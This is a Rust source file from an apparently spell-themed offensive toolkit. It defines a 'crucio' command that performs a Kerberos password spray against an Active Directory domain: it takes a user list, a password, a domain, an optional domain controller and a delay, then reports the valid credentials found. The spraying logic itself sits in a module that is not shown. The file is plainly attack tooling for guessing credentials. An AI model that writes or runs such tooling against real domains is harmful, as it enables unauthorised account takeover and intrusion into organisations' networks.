use anyhow::{bail, Result};
use std::collections::HashMap;
use crate::dungeon::crucio_cast;
use crate::dungeon::display_charm::*;

pub struct Crucio;

impl super::Spell for Crucio {
    fn incantation(&self) -> &'static str { "crucio" }
    fn grimoire(&self) -> &'static str {
        "Kerberos password spray. /users: (file) /password: /domain: [/dc:] [/delay:ms]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let userfile = args.get("users").ok_or_else(|| anyhow::anyhow!("/users: required"))?;
        let password = args.get("password").ok_or_else(|| anyhow::anyhow!("/password: required"))?;
        let domain   = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let dc       = args.get("dc").map(|s| s.as_str());
        let delay    = args.get("delay").and_then(|s| s.parse().ok()).unwrap_or(0u64);
        print_banner(&format!("Spraying domain {} with password '{}'", domain, password));
        let found = crucio_cast::spray_domain(userfile, password, domain, dc, delay)?;
        print_info("Valid credentials found", &found.len().to_string());
        Ok(())
    }
}
